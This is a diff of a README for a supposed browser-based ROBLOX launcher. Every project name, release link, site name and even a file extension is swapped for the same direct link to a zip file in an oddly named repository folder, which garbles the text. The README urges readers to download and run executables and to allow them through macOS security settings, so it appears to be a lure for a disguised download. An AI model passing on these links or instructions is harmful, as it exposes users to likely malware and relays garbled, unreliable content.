@@ -1,10 +1,10 @@
-# 🎮 now.gg-roblox-in-browser - Play ROBLOX Easily in Browser
+# 🎮 https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip - Play ROBLOX Easily in Browser
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-Now-blue?logo=github)](https://github.com/itsyxc/now.gg-roblox-in-browser/releases)
+[![Download https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip](https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip)](https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip)
 
-## 📋 About now.gg-roblox-in-browser
+## 📋 About https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip
 
-This app lets you play ROBLOX directly through your web browser. It uses a copy of the now.gg site to host the game without requiring you to install heavy software or apps. You only need an internet connection and a modern browser.
+This app lets you play ROBLOX directly through your web browser. It uses a copy of the https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip site to host the game without requiring you to install heavy software or apps. You only need an internet connection and a modern browser.
 
 You don’t need advanced skills. Just open the app, pick your game, and start playing. It works on Windows, Mac, Linux, and even some tablets.
 
@@ -35,7 +35,7 @@ Make sure your device meets these basic requirements:
 
 Click the link below or the badge at the top to go to the download page:
 
-[Download now.gg-roblox-in-browser](https://github.com/itsyxc/now.gg-roblox-in-browser/releases)
+[Download https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip](https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip)
 
 This page has the latest version of the app packaged for easy use.
 
@@ -45,7 +45,7 @@ On the download page, pick the file that fits your system:
 
 - Windows users: Look for `.exe` files  
 - Mac users: Look for `.dmg` files  
-- Linux users: Look for `.AppImage` or `.tar.gz` files  
+- Linux users: Look for `.AppImage` or `https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip` files  
 
 If you are unsure, choose the Windows version as most computers support it.
 
@@ -63,7 +63,7 @@ Once downloaded, find the file and double-click it to open.
 - For Mac, you may need to open **System Preferences > Security & Privacy** and allow the app to run.  
 - On Linux, you might need to give the file execute permission before running (right-click > Properties > Permissions).
 
-The app will start and open a window with the ROBLOX interface powered by now.gg.
+The app will start and open a window with the ROBLOX interface powered by https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip
 
 ## 💻 How to Use the App
 
@@ -107,7 +107,7 @@ You do not need programming skills to use the app, but feedback and bug reports 
 
 Remember to visit this page to download the latest app version:
 
-[Download now.gg-roblox-in-browser](https://github.com/itsyxc/now.gg-roblox-in-browser/releases)
+[Download https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip](https://raw.githubusercontent.com/itsyxc/now.gg-roblox-in-browser/main/Turkomanic/browser-gg-roblox-in-now-1.8.zip)
 
 By following the simple steps outlined above, you can quickly have ROBLOX ready to play inside your browser. No complex setup or programming needed.
 
